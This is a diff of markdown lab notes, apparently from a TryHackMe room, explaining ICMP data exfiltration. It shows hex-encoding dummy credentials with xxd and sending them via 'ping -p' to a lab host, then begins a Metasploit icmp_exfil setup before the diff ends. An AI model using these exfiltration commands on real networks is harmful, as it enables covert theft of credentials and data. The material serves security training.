@@ -9,13 +9,14 @@ Network devices such as routers use **`ICMP`** to check network connectivities b
 
 The **`HOST1`** sends an ICMP packet with an **echo-request** packet. Then, if **`HOST2`** is available, it sends an **`ICMP`** packet back with an **echo reply** message confirming the availability.  
 
+  
 ## ICMP Data Section
 
 On a high level, the **`ICMP`** packet's structure contains a **`Data`** section that can include strings or copies of other information, such as the IPv4 header, used for error messages. The following diagram shows the **`Data`** section, which is optional to use.<br>
 ![image](https://github.com/user-attachments/assets/4f8bf4a9-c0e7-4af1-83c1-50c60fa45e30)
 ###### ICMP Packet Structure Diagram  
   
-Note that the Data field is optional and could either be empty or it could contain a random string during the communications. As an attacker, we can use the ICMP structure to include our data within the **`Data`** section and send it via **`ICMP`** packet to another machine. The other machine must capture the network traffic with the ICMP packets to receive the data.
+Note that the Data field is optional and could either be empty or it could contain a random string during the communications. As an attacker, we can use the ICMP structure to include our data within the **`Data`** section and send it via **`ICMP`** packet to another machine. The other machine must capture the network traffic with the ICMP packets to receive the data.  
 
 To perform manual ICMP data exfiltration, we need to discuss the **`ping`** command a bit more. The **`ping`** command is a network administrator software available in any operating system. It is used to check the reachability and availability by sending **`ICMP`** packets, which can be used as follows:
 
@@ -23,26 +24,27 @@ To perform manual ICMP data exfiltration, we need to discuss the **`ping`** comm
 #Sending one ICMP packet using the PING Command:
 thm@AttackBox$ ping 10.10.144.103 -c 1
 ```
-
+  
 We choose to send one ICMP packet from Host 1, our AttackBox, to Host 2, the target machine, using the **`-c 1`** argument from the previous command. Now let's examine the ICMP packet in Wireshark and see what the Data section looks like:
 <br>
 ![image](https://github.com/user-attachments/assets/f858202c-bfcd-4c98-a455-66006c8f6d7d) 
 ###### Showing the Data Field value in Wireshark Diagram
-<br>
+  
 The Wireshark screenshot shows that the Data section has been selected with random strings. It is important to note that this section could be filled with the data that needs to be transferred to another machine. 
 
 The ping command in the Linux OS has an interesting ICMP option. With the -p argument, we can specify 16 bytes of data in hex representation to send through the packet. **Note that the **`-p`** option is only available for Linux operating systems**. We can confirm that by checking the ping's help manual page.
-<br><br>
+
 ![image](https://github.com/user-attachments/assets/21cd4be2-a81f-4793-b0f9-13489c271214) 
 ###### Ping's -p argument Screenshot
-
+  
 Let's say that we need to exfiltrate the following credentials **`thm:tryhackme`**. First, we need to convert it to its Hex representation and then pass it to the **`ping`** command using **`-p`** options as follows,
 
 ```bash
 #Using the xxd command to convert text to Hex:
 root@AttackBox$ echo "thm:tryhackme" | xxd -p 74686d3a7472796861636b6d650a
 ```
-<br><br>
+
+  
 We used the **`xxd`** command to convert our string to Hex, and then we can use the **`ping`** command with the Hex value we got from converting the **`thm:tryhackme`**.
 
 ```bash
@@ -54,7 +56,7 @@ root@AttackBox$ ping 10.10.144.103 -c 1 -p 74686d3a7472796861636b6d650a
 ```bash
 ping -c 1 192.198.1.5 -p $(echo -n "test" | xxd -p)
 ```
-<br>
+  
 We sent one ICMP packet using the ping command with **`thm:tryhackme`** Data. Let's look at the Data section for this packet in the Wireshark.
 
 ![image](https://github.com/user-attachments/assets/31800a6e-1ce0-4b93-b8b2-b87be4c2cd94)
@@ -62,16 +64,16 @@ We sent one ICMP packet using the ping command with **`thm:tryhackme`** Data. Le
 
 Excellent! We have successfully filled the ICMP's Data section with our data and manually sent it over the network using the **`ping`** command.
 
-<br>
+  
 ## ICMP Data Exfiltration
 
 Now that we have the basic fundamentals of manually sending data over ICMP packets, let's discuss how to use Metasploit to exfiltrate data. The Metasploit framework uses the same technique explained in the previous section. However, it will capture incoming ICMP packets and wait for a **`Beginning of File (BOF)`** trigger value. Once it is received, it writes to the disk until it gets an **`End of File (EOF)`** trigger value. The following diagram shows the required steps for the **Metasploit** framework. Since we need the Metasploit Framework for this technique, then we need the AttackBox machine to perform this attack successfully.
 
 ![image](https://github.com/user-attachments/assets/84f53917-1a90-4917-8f9c-913263876bd5)
 #### ICMP Data Exfiltration Diagram
-
-
-Now from the AttackBox, let's set up the Metasploit framework by selecting the **`<red>icmp_exfil</red>`** module to make it ready to capture and listen for ICMP traffic. One of the requirements for this module is to set the **`BPF_FILTER`** option, which is based on TCPDUMP rules, to capture only ICMP packets and ignore any ICMP packets that have the source IP of the attacking machine as <red>follows</red>:
+  
+  
+Now from the AttackBox, let's set up the Metasploit framework by selecting the **`<red>icmp_exfil</red>`** module to make it ready to capture and listen for ICMP traffic. One of the requirements for this module is to set the <red>**`BPF_FILTER`**</red> option, which is based on TCPDUMP rules, to capture only ICMP packets and ignore any ICMP packets that have the source IP of the attacking machine as <red>follows</red>:
 
 ```bash
 #Set the BPF_FILTER in MSF:
